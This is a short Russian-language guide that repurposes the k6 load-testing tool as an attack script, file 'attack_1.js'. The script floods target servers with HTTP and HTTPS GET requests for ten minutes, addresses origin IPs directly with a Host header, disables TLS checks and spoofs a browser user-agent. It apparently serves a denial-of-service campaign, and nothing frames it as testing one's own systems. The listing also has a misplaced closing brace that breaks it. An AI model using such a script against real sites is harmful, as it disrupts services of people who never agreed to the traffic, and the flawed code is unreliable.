```
git clone https://github.com/grafana/k6.git
cd k6
```

создайте новый файл ./samples/attack_1.js

вставьте этот листинг

```
import { check } from 'k6';
import http from 'k6/http';

export let options = {
  insecureSkipTLSVerify: true,
  stages: [
      { duration: "10m", target: 5 },
  ]
}

export default function() {
  let targets = {
    '<url>': '<ip>'
  }
  let reqs = []

  for (let k in targets) {
    reqs.push(
      {
        'method': 'GET',
        'url': `https://${targets[k]}`,
        'params': {
          'headers': {
            'Host': `${k}`,
            'referrer': "",
            'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
          }
        }
      }
    )
    reqs.push(
      {
        'method': 'GET',
        'url': `http://${targets[k]}`,
        'params': {
          'headers': { 'Host': `${k}`,
          'referrer': "",
          'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
          }
        }
      }
    )
  }


  }
  http.batch(reqs);
};
```

запустите

```
k6 run ./samples/attack_1.js
```
